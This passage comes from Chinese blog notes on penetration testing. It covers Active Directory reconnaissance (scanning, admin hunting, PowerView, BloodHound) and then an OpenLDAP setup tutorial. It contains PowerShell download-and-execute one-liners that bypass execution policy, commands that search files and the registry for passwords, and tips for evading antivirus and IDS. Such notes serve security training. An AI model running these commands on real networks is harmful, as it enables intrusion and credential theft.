2.查看系统详细信息(有\"域\"的字段)，如果\"域\"为WORKGROUP则表示当前服务器不在域内\nsysteminfo \n\n\n# 3.查询当前登录域及登录用户信息(\"工作站域DNS名称\"为域名，如果为WORKGROUP则表示当前为非域环境)\n# \"登录域\"表示当前登录的用户是域用户还是本地用户\nnet config workstation\n\n\n# 4.判断主域(域服务器通常会作为时间服务器使用)\nnet time /domain\n    # 三种情况：\n    1.存在域，当前用户不是域用户\n    2.存在域，当前用户是域用户\n    3.当前网络环境为工作组，不存在域\n\n```\n\n####  <font color=red> 域内存活主机探测 </font>\n1. 避免除法防病毒软件报警\n2. 不要使用暴力的;\n3. 不要使用图形化的工具\n4. 使用powershell/vbs等自带的\n5. 白天上班时间探测一遍，深夜分别探测一遍（对比分析存活主机对应的IP地址i）\n\n\n**1.利用`netbios`快速探测**   （优先使用这个协议,会被认为是正常的通信）\n工具：`nbtbios`\n使用方法\n```bash\n# win和Linux下都有\n\n# 这里用win版本的，上传到目标主机(推荐放到目标机器的windows/temp下面)\nnbtscan.exe 192.168.111/24\n```\n参数说明(结果的第三列)：\n\n<img src=\"http://image.xpshuai.cn/20200307145109927_29873.png\" />\n\n\n**2.利用`icmp`协议快速探测内网**\n工具：\n1.ping命令:\n```bash\n# for循环ping整个网段\nfor /L %l in (1,1,254) Do @ping -w 1 -n 192.168.111.%l |findstr \"TTL=\"\n```\n\n2.VBS脚本\n```bash\n没写\n\n# cscript xxx.vbs 运行脚本\n```\n\n\n**3.利用`arp`扫描完整探测内网**\n工具：\n1.arp-scan \n```bash\n# 上传arp.exe 到目标机器运行\nArp.exe -t 192.168.0/20\n```\n2.Empire中的arpscan模块\n```bash\nusemodule situational_awareness/net/work/arpscan\nset ...\nexecute\n```\n3.NiShang里面的脚本: `Invoke-ARPScan.ps1` \n```bash\n# a.远程下载运行\npowershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.1/Invoke-ARPScan.ps1');Invoke-ARPScan -CIDR 192.168.1.0/20\" >> C:\\windows\\temp\\log.txt\n\n# b.本地运行(先上传脚本到目标)\npowershell.exe -nop -exec bypass -Command \"&{Import-Module C:\\windows\\temp\\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/20}\" >> C:\\windows\\temp\\log.txt\n\n# c.无条件运行(没痕迹)\n\n```\n\n\n3.利用常规`tcp/udp端口扫描`探测内网\n工具：`scanline`   (比较老, 但是好用，可在所有win版本使用，动静小)\n```bash\n# -t 是tcp端口， -u是udp端口\nsl -h -t 22,80-89,110,389,445,3389,1099,1433,6379,27017,7001,8080,1521,3306,5432 -u 53,161,137,139 -O c:\\windows\\temp\\sl_res.txt -p 192.168.1.1-254 /b\n\n```\n\n\n\n####  <font color=red> 扫描域内端口 </font>\n通过端口，不仅能了解目标主机所开放的服务，还能找出其开放服务的漏洞、分析目标网络的拓扑结构等\n- 端口的banner信息\n- 端口上运行的服务\n- 常见应用的默认端口\n\n**工具：**\n- 1.telent命令(针对单个，肯定不会触发报警)\n```bash\ntelnet DC1 22  # 查看某台主机某个端口是否开放\n```\n- 2.S扫描器\n```bash\n# 早期的工具，支持大网段\nS.exe TCP 192.168.1.1 192.168.1.112  22,445,3389,1433,6379,8080,80,23,21,25,110,3306,1521,111,445,7001  256  /Banner /save\n# 结果默认保存在安装目录下的result.txt文件中\n```\n- 3.Metasploit内置的端口扫描模块:\n```bash\nsearch portscan\nuse auxiliary/scanner/portscan/tcp  # 还有其他模块\nset ...\nrun\n```\n- 4.PowerSploit下的`Invoke-portscan.ps1`脚本 (不会下载到本地)\n```bash\npowershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1');Invoke-portscan -Hosts 192.168.1.0/24 -T 4 -ports '445,1433,5432,8080,3389,22' -oA C:\\windows\\temp\\log.txt\" \n```\n- 5.NiShang的`Invoke-PortScan`模块\n```bash\nGet-Help Invoke-PortScan -full\n# ResolveHost 解析主机名\nInvoke-PortScan -StartAddress 192.168.0.1 -StopAddress 192.168.0.255 -ResolveHost\n```\n- 6.nmap\n- 7.masscan\n- 8.其他端口扫描工具\n\n>注意扫描是否会触发IDS等设备\n\n\n**端口Banner信息**\n```bash\n通过扫描发现了端口，可以使用客户端连接工具或nc，获取服务端的Banner信息 \n获取Banner信息之后，可以在漏洞库中查找相应的CVE编号的POC/Exp, 在Exploit-DB、Seebug、安全焦点的BugTraq 等平台查看相关漏洞利用工具，然后到目标系统中验证漏洞是否存在，从而有针对性地进行安全加固\n```\n\n**常见端口机器攻击方向**： \n[链接](http://www.xpshuai.cn/01-信息搜集/#4.%20收集常用端口信息)\n\n\n####  <font color=red> 收集域内基础信息 </font>\n\n```\n# 域用户才有权限进行以下查询（本机的system权限也可以，机器的用户名+$）\n\n# 查询域\nnet view /domain  \n# 查询域内所有计算机(可通过主机名对主机角色进行初步判定, 比如web可能是web服务器)\nnet view /domain:domainName   \nnet view /domain:WORKGROUP   \n\n# 查看域内所有用户组\nnet group /domain    \n\n# 查看域成员计算机列表\nnet group \"domain computers\" /domain   \n\n# 获取域密码信息(密码策略,密码长度,错误锁定等信息)\nnet accounts /domain   \n\n#  获取域信任信息\nnltest /domain_trusts  \n```\n\n\n####  <font color=red>查找 域控制器(DC) </font>\n```bash\n# 查看DC的机器名\nnltest /DCLIST:xxx\n\n# 查看DC的主机名\nnslookup -type=SRV _ldap._tcp\n\n# 查看当前时间\nnet time /domain\n\n# 查看域控制器组\nnet group \"Domain Controllers\"/domain\n\nnetdom query pdc\n```\n\n\n#### <font color=red> 域内用户和管理员的获取  </font>\n1.查询所有域用户列表：\n```\nnet user /doamin    # 向DC进行查询域用户列表\nwmic useraccount get /all   # 获取域内用户详细信息\ndsquery user  # 查看存在的用户\n# 常用的dsquery命令\ndsquery computer # 查找目录中的计算机\ndsquery contact  # 查找目录中的联系人\ndsquery subnet   # 查找目录中的子网\ndsquery group    # 查找目录中的组\ndsquery ou       # 查找目录中的组织单位\ndsquery site     # 查找目录中的站点\ndsquery user     # 查找目录中的用户\ndsquery quota     # 查找目录中的配额规定\ndsquery partition  # 查找目录中的分区\ndsquery * -     # 用通用的 LDAP 查询来查找目录中的任何对象\n\nnet localgroup administrators  # 查询本地管理员组用户(实际中，为了方便管理，会有域用户被设置为域机器的本地管理员用户)\n```\n\n2.查询域管理员用户组\n```bash\n# 查询域管理员用户\nnet group \"doamin admins\" /domain\n\n# 查询域管理员用户组\nnet group \"Enterprise Admins\" /domain\n```\n\n\n#### <font color=red>定位域管理员 (很重要)  </font>\n当一台机器加入域后，会默认给域管理员组赋予本地系统管理员权限\n\n###### 常规定位域内管理员`方法`：\n> 第二种方法使用较多\n\n1. 日志 （本地机器的管理员日志，可以使用`脚本`或`wevtuti`l导出并查看）\n2. 会话 （域内每个机器的等会会话，可以匿名查询，无需权限，可以使用`netess.exe`或`powerview`等工具查询）\n\n\n###### 常用的定位域管理员`工具`：\n1.psloggedon.exe        \n```bash\n# 下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon\n# 查看本地登录的用户 和 通过本地计算机或远程计算机的资源登录的用户\n# 如果指定的是\"用户名\"而不是计算机名，则会搜索网上邻居的计算机，并显示该用户当前是否已经登录\n# 某些功能需要管理员权限\n\npsloggedon \\\\DC1\n# - 显示支持的选项和用于输出值的单位\n# -l  仅显示本地登录，不显示本地和网络资源登录\n# -x  不显示登录时间\n# \\\\computername:    指定要列出登录信息的计算机name\n# username:    指定用户名\n```\n\n2.PVEFindADUser.exe      \n```bash\n# 下载地址： https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn\n# 可用于查找活动目录\n# 需要 .net 2.0, 且 需管理员权限\n\nPVEFindADUser.exe  <参数>\n# \nPVEFindADUser.exe  --current   # 显示域中所有计算机上当前登录的用户\nPVEFindADUser.exe  --last   # 显示域中目标计算机上最后登录的用户\n# 参数 -noping 阻止在之前ping\n\n```\n\n4.netsess.exe                        \n```bash\n# 枚举工具\n\nnetsess.exe  <参数>\n# -f file.txt   指定要提取主机列表的文件\n# -e file.txt   指定要排除的主机名的文件\n# -o file.txt   将所有输出都重定向到指定的文件\n# -d domain     指定要提取主机列表的域，若没指定，则从当前域中提取主机列表\n# -g group      指定搜索的组名，若没指定，就从当前域中提取主机列表\n# -c            对已找到的共享目录/文件的访问权限进行检查\n```\n\n5.NetView.exe    \n```bash\n# 地址： https://github.com/mubix/netview\n\n```\n\n6.Nmap的NSE脚本\n```bash\n# 下载地址   https://nmap.org/nsedoc/scripts/smb-enum-sessions.html\nsmb-enum-session.nse    # 获取远程机器的登录会话,查看当前是否有用户登录\nsmb-enum-domains.nse    # 获取主机信息、用户、可使用密码策略的用户等\nsmb-enum-users.nse      # 如果获得的权限有限，使用这个获得更多的域用户的信息\nsmb-enum-shares.nse     # 遍历远程主机的共享目录\nsmb-enum-processs.nse   # 对主机的系统进程进行遍历（可以知道主机正在运行什么软件）\nsmb-os-discovery.nse    # 收集目标的一些信息\n```\n\n7.PowerShell 中， PowerView脚本： Invoke-UserHunter   \n```bash\n# 下载地址： https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView\n\n# Invoke-StealthUserHunter    只需要进行一次查询，就可以获取域里面的所有用户(隐蔽性高，但不一定全面)\n\n# Invoke-UserHunter 找到域内特定的用户群，接收用户名、用户列表和域组查询\npowershell -nop -exec bypass -Command \"& {Import-Module .\\PowerView.ps1; Invoke-UserHunter}\" \n```\n\n8.Empire下`user_hunter`模块\n```bash\n# 也有类似Invoke-UserHunter的模块： user_hunter   --> 用于查找域管理员登录的机器\nusemodule situational_awareness/network/powerview/user_hunter\n```\n\n\n\n#### <font color=red>查找域管理进程 </font>\n如果在无法立即拥有权限的系统中获得管理员进程，那么通常可以采用的方法是：在跳板机之间跳转，直至获得域管理员权限，同时进行一些分析工作，进而找到测试的路径\n\n###### a.本机检查\n1．获取域管理员列表 \n```bash\nnet group \"domain admins\" /domain\n```\n2．列出本机所有进程及进程用户 \n```bash\ntasklist /v\n```\n3．寻找是否有进程所有者为域管理员的进程\n能用上面两种方法找到自然最好，但实际往往并非如此......\n\n###### b.查询域控制器的与用户会话（脚本）\n1. 收集域控制器的列表\n```bash\n# 可以使用LDAP查询\n# net\nnet group \"domain Controllers\" /domain\n```\n2. 收集域管理员的列表\n```bash\nnet group \"domain Admins\" /domain\n```\n3. 收集所有活动域会话的列表 \n```bash\n# 使用Netsess.exe插叙每个域控制器，\nnetsess -h\n```\n4. 将域管理员列表与活动会话列表交叉引用，以确定哪些IP地址具有活动域令牌\n```bash\n#\n#也有其他的的GDA脚本(Get Domain Admins)  https://github.com/nullbind/Other-Projects/tree/master/GDA\n```\n\n如果没有会话： 隔一段时间，等着有会话 / 脚本自动隔一段时间运行\n\n###### c.扫描远程系统上运行的任务\n前提：使用了共享\n<img src=\"http://image.xpshuai.cn/20200308144440441_12568.png\" />\n\n###### d.扫描远程系统上NetBISO信息\nNetBISO是一个协议，端口137,138,139之类\n也可使用工具：`nbtscan`\n<img src=\"http://image.xpshuai.cn/20200308144903911_31072.png\" />\n\n\n\n####  <font color=red> 模拟域管理员的方法</font>\n如果已经拥有了meterpreter会话，就可以使用`Incognito`来模拟域管理者添加一个域管理员，通过尝试遍历系统中所有可用的授权令牌来添加新的管理员  \n第四章见\n\n\n\n\n#### <font color=red> 利用 PowerShell 收集域信息</font>\n###### PowerShell\nPowerShell常用的执行权限共有四种，具体如下。\n```\nRestricted：默认设置，不允许执行任何脚本。\nAllsigned：只能运行经过证书验证的脚本。\nUnrestricted：权限最高，可以执行任意脚本。\nRemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名。\n\n在 PowerShell 中输入“Get-ExecutionPolicy”，看到为默认 Restricted 权限\n```\n\n###### PowerView\n>是一款依赖 PowerShell 和 WMI 对内网域情况进行查询的常用渗透脚本，PowerView 集成在` PowerSploit` 工具包中\n[下载地址](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)\n\nBypassUAC 最直接的办法： ` -ExexutionPolicy ByPass`\n\n\n**PowerView 中的常用命令**\n```powershell\n# 先 Import-Moudle .\\PowerView.ps1\n\nGet-NetDomain    #获取当前用户所在的域名称\nGet-NetUser    #返回所有用户的详细信息\nGet-NetDomainController    #获取所有域控制器\nGet-NetComputer    #获取所有域内机器的详细信息\nGet-NetOU    #获取域中的 OU 信息\nGet-NetGroup    #获取所有域内组和组成员信息\nGet-NetFileServer    #根据 SPN 获取当前域使用的文件服务器\nGet-NetShare   #获取当前域内所有网络共享\nGet-NetSession    #获取在指定服务器存在的会话信息\nGet-NetRDPSession   # 获取在指定服务器存在的远程连接信息\nGet-NetProcess    #获取远程主机的进程信息\nGet-UserEvent    #获取指定用户的日志信息\nGet-ADObject    #获取活动目录的对象信息\nGet-NetGPO    #获取域所有组策略对象\nGet-DomainPolicy   # 获取域默认或域控制器策略\nInvoke-UserHunter    #用于获取域用户登录计算机及该用户是否有本地管理权限\nInvoke-ProcessHunter    #查找域内所有机器进程用于找到某特定用户\nInvoke-UserEventHunter    #根据用户日志获取某域用户登录过哪些域机器\n\n```\n\n\n\n\n\n#### <font color=red> 域分析工具 BloodHound </font>\n通过图与线的方式，把域内信息直观的展示\n\nhttps://github.com/BloodHoundAD/BloodHound/releases/download/2.0.4/BloodHound-win32-x64.zip\n\n###### 配置环境\n1.下载安装jdk并配置\n2.下载安装Neo4j（Neo4j Server -> Community Server->Windows）\n3.启动Neo4j数据库服务端(neo4j->非关系型数据库.   进入解压后的bin，输入命令`ndo4j.bat console`启动服务)\n4.浏览器输入：127.0.0.1:7474/browser，用户名密码默认`neo4j`\n4.下载BloodHound, 解压后双击exe启动， 输入`bolt://localhost:7687`和账户密码，就安装好了\n\n\n###### 使用\n主界面按钮和选项描述：\n......\n\n\n**采集数据**\n- 哪些用户登录了哪些机器\n- 哪些用户拥有管理员权限\n- 那些用户和组属于哪些组\n\nBloodHound采集需依赖PowerView.ps1的BloodHound：\nBloodHound分为两部分：\n            1.PowerShell采集器脚本([SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1))\n            2.可执行文件SharpHound.exe\n\n```bash\n# 使用SharpHound.exe采集域内信息\n把SharpHound.exe复制到目标机器\nsh.exe -c all\n```\n\n**导入数据**\n在当前目录下，会生成``xxx_BloodHound.zip`压缩包  \n可以把压缩文件放到界面上节点信息以外的任意位置\n\n**查询信息**\n主界面左上角的查询`Queries`, 进入模块，可以看到预定义的常用查询条件\n<img src=\"http://image.xpshuai.cn/20200507194413982_1350438555.png\" />\n\n按住`ctrl`键，可以循环显示； 在其图标上按住鼠标左键可以移动位置\n\n\n\n\n\n#### <font color=red> 敏感数据的防护 </font>\n>价值比较高的东西基本上是全部在内网的\n\n###### 资料/数据/文件的定位流程\n1. 定位内部人事组织结构。\n2. 在内部人事组织中寻找需要监视的相关人员。\n3. 定位相关人员的机器。\n4. 监视相关人工作时存放文档的位置。\n5. 列出存放文档服务器的目录。\n\n\n######  定位内部人事组织结构\n**1. 人事组织结构图**\n类似公司结构图可以在目标的外部站点(类如首页`“关于我们”` )和网上暴露的\n信息(类如发表在`招聘网的各类岗位名称`)来分析,或者在`内网电脑中寻找`类似的人\n事组织结构图, 再`结合分析人事资料里相关员工资料与域内用户名或者用户组的对应\n关系`, 可以很快定位到你需要寻找的人员使用的机器\n\n\n**2. 人力资源主管个人电脑**\n在内网中通过上述种种方法定位到人力资源主管个人机器,通常单位人力资源主\n管电脑中会存在公司所有人员的身份信息及相关材料,寻找到人力资源主管个人机器\n后在其电脑中寻找公司人力资源相关文档得存放位置,然后从人力资源文档中寻找公\n司相关人员信息,直至收集到你所需要的材料。\n\n3. `net group /domain`  \n可以查询域内所有用户组的信息, 同样可以利用该命令来定位公司内部人事结构\n<img src=\"http://image.xpshuai.cn/20200506224521447_1788866667.png\" />\n除了内置重点组外, `自建的域组`需要特别关注\n```bash\n(1)IT组/研发组: 他们掌握了大量的内网密码,数据库密码等。\n(2)秘书组: 他们掌握着大量的目标机构的内部传达文件和资料,为信息分析业务提供信息。\n(3)财务组: 他们掌握着目标机构大量的资金往来与目标企业的规划发展,并且可以通过资金表,来判断出目标组织的整体架构。\n(4)CXX组: 如ceo cto coo等,不同的组织名字不同,如部长、厂长、经理等,会拥有目标机构的机密信息\n```\n\n\n\n\n###### 重点核心业务机器及敏感信息防护\n> 重点核心业务机器是渗透测试人员通常比较关心的机器,因此需要做好相应的防护措施。\n\n**1.核心业务机器**\n```bash\n- 高管/系统管理员/财务/人事/业务人员的个人计算机。\n- 产品管理系统服务器(仓库管理系统)\n- OA 办公系统服务器。\n- 财务应用系统服务器。\n- 核心产品源码服务器(对于 IT 公司,会架设自己的 SVN 或者 GIT 服务器)\n- 数据库服务器。\n- 文件服务器/共享服务器。\n- 邮件服务器。\n- 网络监控系统服务器。\n- 其他服务器(分公司、工厂)\n```\n\n**2.各类敏感文件信息**\n```bash\n- 站点源码备份文件、数据库备份文件、配置文件备份等(后缀 XX.zip,XX.sql 等)\n- 各类数据库的 Web 管理入口,如 phpmyadmin、adminer 等。\n- 浏览器密码和浏览器 cookie(IE、Chrome、Firefox)\n- 其他用户会话、3389 和 ipc$连接记录、各用户回收站的信息等。\n- Windows 无线密码。\n- 目标内部的各种账号和密码信息,包括邮箱、VPN、FTP、TeamView 等。\n```\n\n\n###### 应用与文件形式的信息收集\n说白了就是翻文件（包括一些应用的配置文件、敏感文件、密码、远程连接、员工账号、电子邮箱等）\n\n不管什么途径获得的内网机器,首先需要知道的就是这台机器所属人员的职位、权利,通常一个高权利的人他在内网的权限比一般员工要高很多,他的电脑内也会有很多重要的、敏感的个人或公司内部文件。\n\n用户在内网中工作时,建议不要将一些特别重要的资料放在公开的计算机中,必要时一定要对 Office 文档进行加密,密码也不要太过于简单\n\n**常用搜索：**\n1.搜索指定含有任意多关键字的文件名\n```bash\ndir c:\\*.doc /s\ndir /b/s password.txt\ndir /b/s config.*dir /s *pass* == *cred* == *vnc* ==*.config*\n```\n\n2.搜索文件名为password.txt/xml/ini的文件,这个操作可能造成大量的输出\n```\nfindstr /si password *.xml *.ini *.txt\n```\n\n3.搜索带有关键词的注册表项,下例中是查询的关键词是 \"password\"的命令\n```\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n```\n\n4.对于加密office办公软件\n```bash\n如果是低版本如2003的话,可以在百度搜一些网上的破解软件进行破解。\n\n如果是高版本的话,可以在目标用户打开文件时使用微软SysinternalsSuite套装中\n的抓取dump的工具-procdump来抓取内存dump,然后用内存查看器直接查看文件内容。\n```\n\n\n#### <font color=red> 分析域内网段划分情况及拓扑结构 </font>\n###### 目标主机基本架构的判断\n常见的 Web 架构：\n```bash\n- ASP + Access + IIS 5.0/6.0 + Windows Sever 2003\n- ASPX + MSSQL + IIS 7.0/7.5 + Windows Sever 2008\n- PHP + MySQL + IIS\n- PHP + MySQL + Apache\n- PHP + MySQL + Ngnix\n- JSP + MySQL + Ngnix\n- JSP + MSSQL + Tomcat\n- JSP + Oracle + Tomcat\n```\n\n\n###### 域内网段划分信息\n内网的环境判断,首先需要分析下内网IP分布情况,一般可以通过内网中路由器、交换机等设备、snmp、弱口令等来获取内网网络拓扑或DNS域传送信息泄漏,另外一般大公司都会有内部网站,也可通过内部网站公开内容链接找出部门ip段。\n\n分析出内部网络是怎么划分的?是按照部门划分的网络段?还是按照楼层?还是\n按照地区?通常内网可分为DMZ区、办公区和核心区(生产区),了解整个内网的网\n络分布和组成,也有助于我们寻找内网核心业务。\n\n1.DMZ 区\n```bash\n在实际的渗透测试中,大多数情况下,在外围 Web 中拿到的权限在 DMZ 区。这个区域不属\n于严格意义上的内网。如果 DMZ 区域访问控制策略配置合理,DMZ 区会处在内网区能够访问\nDMZ 区而 DMZ 区访问不了内网区的情况下,相关知识在第 1 章中已经详细讲解过,此处不再重\n复。\n```\n2.办公区\n```bash\n办公区,顾名思义,是指公司员工日常的工作区。办公区的安全防护水平一般不是高,基本\n防护机制大多为杀毒软件或主机入侵检测产品。在实际应用中,攻击者在获取权限后,利用内网\n信任关系,很容易扩大攻击面。一般情况下,攻击者很少会直接到达办公区。攻击者如果想进入\n办公区,可能会使用鱼叉攻击、水坑攻击或者社会工程学等手段。\n\n办公区按照系统可分为： OA 系统、邮件系统、财务系统、文件共享系统、域控、企业版杀毒\n系统、内部应用监控系统、运维管理系统等,按照网络段可分为域管理网段、内部服务器系统网\n段、各部门分区网段等。\n按照网络段可分为:域管理网段、内部服务器系统网段、各部门分区网段等。\n```\n3.核心区\n```bash\n核心区一般存放企业最重要的数据、文档等信息资产,如域控制器、核心生产机器等,安全\n设置也最为严格。根据目标开展的业务不同,相关服务器可能存在于不同的网段上。通过分析服\n务器上运行的服务和进程,可以推断出目标主机使用的运维监控管理系统和安全防护系。在内网\n中横向移动时,会优先查找这些主机。\n\n核心区按照系统可分为业务系统、运维监控系\n按照网络段可分为:各不同的业务网段、运维监控网段、安全管理网段等。\n```\n\n\n###### 多层域结构分析\n我们需要先分析出当前内网是否存在多层域、现在这计算机所在的域是几级子域、这个子域的域控制器及根域的域控制器是哪些、其他域的域控制器是哪些、域之间是否存在域信任关系等。\n\n\n###### 绘制内网拓扑图\n\n\n\n\n\n------\n\n\n###### 基础信息搜集- 思维图\n<img src=\"http://image.xpshuai.cn/内网信息搜集-思维图.Jpeg\" />\n\n\n","tags":["内网"],"categories":["渗透测试"]},{"title":"ubuntu server-LDAP","url":"%2Fposts%2F45429%2F","content":"\n\n# LDAP\n>看书前先看目录\n\n#### 理解\n\n不同于文件系统的目录(D/d) -> 首字母大写是目录服务，首字母小写的文件系统目录\n\n目录服务是企业网络的核心基础结构\n```bash\n- 如此重要的服务并不被大多数熟悉\n- 很少独立使用，与其他服务结合使用\n- 微软的企业战略（埋坑: 一旦底层用了微软的AD,你以后的一些肯定也要用我的集成的产品）\n- 类似: 每一本书都有自己的目录\n```\n\n数据集中存储的应用需求\n```\n- 集中存储、集中管理、集中定位\n- 身份认证、公钥分发、邮件路由、地址查询、应用配置、单点登录(SSO -> 只登录一次就不用重复登录了)\n- 面向大量频繁的数据查询操作，少量写操作（基本不变的数据）\n- 权限限制授权用户查询\n```\n\n\n我是否应该使用目录服务(根据自己公司情况)\n```\n- 用户认证\n- 机器认证\n- 用户和组\n- 电话地址薄\n- 组织呈现\n- 资产跟踪\n- 集中应用配置\n- PEX / 网络设备配置\n```\n\n\n\n#### DAP\n\n**软件架构**\n- 不同与SQL的后端层级化数据库（`主要面向查询操作`）\n- 与DNS的分布式结构更接近，命名上通常与DBS命名保持一致(在目录服务内所有存储对象都有唯一的路径名称)\n- 数据库基于键值对的方式存储数据\n- 标准统一的服务前端应用查询访问接口(基于OSI协议栈,  X.500)\n- 统一的客户端查询组件和协议(C/S)\n- 支持通信会话加密\n- Directory information tree (DIT)\n\n\n**与自建数据库开发相比**\n- 专门针对查询服务的数据库结构类型\n- 统一标准的查询结构以及通信协议（DAP ->目录访问协议）\n\n\n\n\n#### LDAP\n> Lightweight Directoy Access Protocol    轻量目录访问服务\n\n\n- 命名上通常与DBS命名保持一致(在目录服务内所有存储对象都有唯一的路径名称)\n- 数据库基于键值对的方式存储数据\n- X.500标准的部分特性集, 各厂商不同\n- 基于TCP/IP协议通信(TCP `389`)\n- 可构建面向互联网和本地网络的目录服务\n\n最常见的LDAP服务\n```bash\n# 微软的活动目录 AD\n企业网络资源全部加入域，统一存储、统一呈现、统一管理、安全边界\n\n# Novell eDirectory\n```\n\n\n\n**命名空间**\n```bash\n# 全局路径： Distinguished Name (DN)\n# 相对路径： Relative Distinguished\n# 目录容器： Directory Container (DC)   每一层\n# 组织单位:  Organisation Unit (OU)     通常按照部门划分\n# 数据项： entries (object, class)\n        一组预先定义的属性集合\n        uid, 姓，名，帐号，邮箱，电话, 照片...\n\n# 基础架构：Schema\n        objectClass 定义所有对象类型及其属性\n        Schame 可按应用需要扩展(美国对象在ASN.1结构中都有自己的位置 -- SNMP)\n\n# 通用名： common name (CN)\n```\n\n**传统命名空间**\n- 无固定的命名规则\n- 按照地理空间命名\n\n<img src=\"http://image.xpshuai.cn/20200507135251359_1631864771.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200507135329746_833117774.png\" />\n\n```bash\n# 写法\nuid=babs, ou=People, dc=example, dc=com\n```\n\n**LDAP协议**\nLDAP最初作为TCP/IP客户udan与X.500目录服务网关之间发通信协议\nLDAPv3:\n- 强身份认证和数据加密\n- 基于证书的SSL加密\n- 使用Unicode编码实现国际化\n- Schema可扩展\n\n\n#### 安装并配置LDAP\n>拿出一台服务器作为专门的LDAP的服务器，以后的身份认证都使用集中的LDAP的(不局限与操作系统，`Web应用也可以`，只要程序支持ldap就可以使用这个做身份认证)\n\n先修改主机名：\n```bash\nsudo sed -i 's/preserve_hostname:false /preserve_hostname:true /g' /etc/cloud/cloud.cfg\n\necho \"192.168.0.104 ldap.lab.com\" | sudo tee -a /etc/hosts  # ip地址与名称的解析关系\n# 修改主机名\nsudo hostnamectl set-hostname ldap.lab.com\n\nreboot\n```\n\n安装 OpenLDAP\n```bash\n# Ubuntu Linux中默认的LDAP实现\nsudo apt install slapd ldap-utils\n# slapd 是服务端和后台进程(即LDAP server)\n# ldap-utils  （ldap工具）\n    ldapadd       # 添加数据\n    ldapdelete    # 删除数据\n    ldapmodify    # 修改\n    ldapsearch    # 查询（最常使用）\n    ldappasswd    # 修改密码\n    ... ...\n```\n\n修改配置文件\n```bash\n  \n# sudo vim /etc/ldap/ldap.conf\nBASE    dc=lab,dc=com    # 目前和dns的域名保持一直即可\nURI     ldap://ldap.lab.com:389    # 可以通过这个地址对..进行查询\n```\n\n初始化配置\n```bash\n# 一次就够了!!!\nsudo dpkg-reconfigure slapd\n\n# 还可以设置一次密码\n# 数据库建议选择MDB\n```\n\n验证\n```bash\n# 多种验证方式\nsudo slapcat\n\nsudo tree /etc/ldap/slapd.d/   # 有内容就可\n\n# 默认管理员帐号 admin\n\nldapsearch -x -LLL -b dc=lab,dc=com \nldapsearch -x -LLL -b dc=lab,dc=com dn  # 后面的内容是筛选\n# -x    简单身份验证\n# -LLL  以标准LDIF文件格式显示结果\n# -b    基地址\n```\n\n\n**向目录中添加记录**\n保存信息\n```bash\n# 保存信息到文件\n# vim add.ldif\n\n# ou: 物理的层级结构划分\ndn: ou=People,dc=lab,dc=com\nobjectClass: organizationalUnit\nou: People\n# 物理的\ndn: ou=Group,dc=lab,dc=com  # ou的名称叫Group, 一个对象只能在一个ou中, ou是物理上的\nobjectClass: organizationalUnit\nou: Group\n\n# 逻辑的\n# 组帐号s\ndn: cn=delevopment,ou=Group,dc=lab,dc=com   # 创建一个组，cn别名\nobjectClass: organizationalUnit\ncn: delevopment\ngidNumber: 3000\n# 用户帐号\ndn: uid=zhangsan,ou=People,dc=lab,dc=com   # 创建一个组，cn别名\nobjectClass: inetOrgPerson    # 继承某些对象类型\nobjectClass: posixAccount\nobjectClass: shadowAccount\nuid: zhangsan\nsn: zhang\ngivenName: san\ncn: san zhang     # 别名\ndisplayName: San Zhang\nuidNumber: 2000\ngidNumber: 3000    # 让用户加入某个组\nuserPassword: 123465\nloginShell: /bin/bash\nhomeDirectory: /home/zhangsan/\n```\n\n导入：\n```bash\nldapadd -x -D cn=admin,dc=lab,dc=com -W -f add.ldif\n# -x    简单身份验证\n# -D    指定管理员帐号(完整的别名： cn=admin,dc=lab,dc=com)   \n# -W    提示输入密码\n# -f    指定ldif文件\n```\n\n验证\n```bash\nldapsearch -x -LLL -b dc=lab,dc=com 'uid=zhangsan' cn sn gidNumber uidNumber givenName\n\n# 查看属性类型和值 参考网址\nhttps://ldapwiki.com/wiki/ObkectClass#Types\n```\n\n\n\n**修改数据**\n跟上面是类似的\n\n<img src=\"http://image.xpshuai.cn/20200507151131491_1817511878.png\" />\n\n\n\n\n\n#### Web管理\n手动写配置太麻烦，图形化的简化了操作\nWeb应用程序(有很多种)： `ldap-account-manager` (lam)\n\n```bash\nsudo apt install apache2\nsudo apt install php php-cgi libapache2-mod-php php-common php-pear php-mbstring\n\nsudo a2enconf php7.2-cgi    # 激活这个模块\nsudo systemctl reload apache2\nsudo systemctl restart apache2\n\nsudo apt install ldap-account-manager\n\n\n# ldap-account-manager使用的数据库使用的是目录服务的数据库，但是他的数据也没有写到数据库中，而是存在了配置文件中\n# 访问即可\n# http:/192.168.0.104/lam\n\n# 点击右上角 LAM configuration 配置  edit server... , 进行简单配置\n# 其他配置根据自己需求来改\n\n```\n\n\n<img src=\"http://image.xpshuai.cn/20200507155013573_1158190765.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200507153818370_1691714384.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200507153853899_1124405028.png\" />\n\n\n\n**设置安全访问**\n```bash\nsudo vim /etc/apache2/conf-enabled/ldap-account-manager.conf\n    #Require all granted    注释掉所有ip可访问\n    Require ip 127.0.0.1 192.168.0.0/24\n\n# 重启服务\n```\n\n\n**其他ldap基于web的管理工具**\n```bash\n# phpLDAPAdmin\nsudo apt install phpldapadmin\n\n# 创建组帐号 \n# 创建帐号\n# ...\n```\n\n\n\n#### 客户端\n\n###### Windows客户端\nwin自带的`GINA`提供Windows系统登录界面， 支持本机、域账户登陆\n\n`pGina`开源身份认证提供者\n    - 集成并替换window系统默认的GINA\n    - 通过插件支持大量身份验证数据存储(LDAP, MySQL, RADIUS)\n    - `http://pgina.org` 下载安装稳定版\n\n进行一些配置\n\n\n\n###### Linux客户端\n域名解析\n```bash\necho \"192.168.0.104 ldap.lab.com\" |sudo trr 